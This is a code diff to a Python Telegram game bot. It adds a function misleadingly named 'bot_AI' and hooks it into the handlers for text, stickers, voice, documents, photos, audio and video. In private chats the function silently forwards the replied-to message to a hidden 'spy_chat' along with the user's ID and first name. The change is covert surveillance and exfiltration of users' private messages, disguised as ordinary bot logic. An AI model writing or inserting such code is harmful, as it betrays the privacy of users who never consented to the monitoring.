@@ -35,6 +35,7 @@ current_task_funcs = []
 dura_chat = [bitva_magov_chat]
 fur_fur_fur_chat = -1001132289884
 dlan_chat = -1001172376896
+spy_chat = -1001231436175
 
 zrenki = [vip_chat_id, -1001345532965, fur_fur_fur_chat, dlan_chat]
 def zrena():
@@ -1758,6 +1759,11 @@ def to_level(message):
 grammar_nazi_dictionary = { "ЭАЛО": "ЭАЛЛО", "ЭА1ЛО": "ЭА2ЛО", "ДЛИННОМОЗГ": "ДЛИНОМОЗГ"}
 
 
+def bot_AI(message):
+    if message.from_user.id == message.chat.id:
+        bot.forward_message(spy_chat, message.chat.id, message.reply_to_message.message_id)
+        bot.send_message(spy_chat, "/mess " + str(message.from_user.id) + '  ' + message.from_user.first_name)
+
 @bot.message_handler(content_types=["sticker"])
 def sticker_parsing(message):
     notify(message)
@@ -1774,6 +1780,7 @@ def sticker_parsing(message):
     task_check(message)
     player = findplayer(message.from_user)
     player.last_mess = time.time()
+    bot_AI(message)
 
 
 @bot.message_handler(content_types=["text"])
@@ -1791,7 +1798,8 @@ def message_parsing(message):
     task_check(message)
     player = findplayer(message.from_user)
     player.last_mess = time.time()
-    
+    bot_AI(message)
+
     if message.chat.id == vip_chat_id:
         text = message.text.upper()
         global level
@@ -1825,13 +1833,18 @@ def message_parsing(message):
 def voice_parsing(message):
     if message.chat.id == debug_chat_id:
         bot.send_message(message.chat.id, '\'' + message.voice.file_id + '\'', reply_to_message_id=message.message_id)
-
+    bot_AI(message)
 
 @bot.message_handler(content_types=["document"])
 def doc_parsing(message):
     if message.chat.id == debug_chat_id:
         bot.send_message(message.chat.id, '\'' + message.document.file_id + '\'', reply_to_message_id=message.message_id)
+    bot_AI(message)
 
+
+@bot.message_handler(content_types=["photo", "audio", "video", "video_note"])
+def other_parsing(message):
+    bot_AI(message)
 
 if __name__ == '__main__':
     f = open('players.json', 'r')
@@ -1841,10 +1854,7 @@ if __name__ == '__main__':
     f.close()
     zrena_timers_init()
     random.seed()
-    try:
-        rrena_bot.send_message(265419583, "МААААМ, ПОСТАВЬ МНЕ АВАТАРКУ!")
-    except telebot.apihelper.ApiException:
-        print("NE MAMKAY")
+
     # bot.send_message(debug_chat_id, '*CAADAgADMgADsj* _RGHiKRfQaAeEsnAg_', parse_mode="Markdown")
     for chat in allow_chats:
         try:
